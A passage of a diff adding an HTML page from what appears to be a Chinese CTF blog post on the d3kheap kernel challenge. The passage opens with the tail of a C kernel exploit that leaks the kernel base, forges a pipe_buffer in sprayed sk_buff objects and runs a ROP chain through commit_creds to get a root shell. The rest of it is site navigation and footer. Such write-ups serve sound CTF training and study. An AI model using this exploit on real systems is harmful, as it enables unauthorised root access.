+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+                <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">></span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                kernel_offset <span class="token operator">=</span> pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">-</span> ANON_PIPE_BUF_OPS<span class="token punctuation">;</span>
+                kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// 从众多的 sk_buf 中找到 pipe_buf</span>
+
+    <span class="token comment">// 接下来就是劫持控制流了，劫持 pipe_buffer->ops->release</span>
+    <span class="token comment">// 最后是 rop 链的构造环节</span>
+
+    pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>pipe_buffer <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">;</span>
+
+    pipe_buf_ptr<span class="token operator">-></span>page <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"114514"</span><span class="token punctuation">;</span>
+    pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">=</span> victim_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
+
+
+    ops_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>pipe_buf_operations <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    ops_ptr<span class="token operator">-></span>release <span class="token operator">=</span> PUSH_RSI_POP_RSP_POP_4VAL_RET <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+
+    rop <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> POP_RDI_RET <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> INIT_CRED <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> COMMIT_CREDS <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class="token operator">+</span> kernel_offset <span class="token operator">+</span> <span class="token number">22</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
+
+    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">"PUSH_RSI_POP_RSP_POP_4VAL_RET"</span><span class="token punctuation">,</span>PUSH_RSI_POP_RSP_POP_4VAL_RET <span class="token operator">+</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 往 sk_buf object 中写 fake_pipe_buffer 结构体从而控制某一 pipe_buffer</span>
+
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PIPE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span></code></pre>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
+
+
+    
+
+    
+<nav class="article-nav">
+  
+  
+    <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">教你学内核-tty,seq结构体利用</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=教你学内核-d3kheap - -NIYAH-&url=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=教你学内核-d3kheap - -NIYAH-&u=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=教你学内核-d3kheap - -NIYAH-&url=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <box-icon name='search' color="#3c4859"></box-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Binary/">Binary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BUUCTF/" rel="tag">BUUCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DASCTF/" rel="tag">DASCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Das/" rel="tag">Das</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA/" rel="tag">IDA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LLVM/" rel="tag">LLVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNHUB/" rel="tag">PWNHUB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UAF/" rel="tag">UAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable/" rel="tag">pwnable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/" rel="tag">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A9%E7%BF%BC%E6%9D%AF/" rel="tag">天翼杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag">栈迁移</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/" rel="tag">祥云杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%95%BF%E5%AE%89%E6%9D%AF/" rel="tag">长安杯</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/">教你学内核-d3kheap</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/">教你学内核-tty,seq结构体利用</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/">教你学内核-linux kernel ROP 下的保护绕过</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/">教你学内核-sudrv</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/">教你学内核-qwb-core</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            -NIYAH- &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1629946964125.js"></script>
+
+
+<script src="/dist/custom.js?1629946964125.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+
+
+</body>
+
+</html>
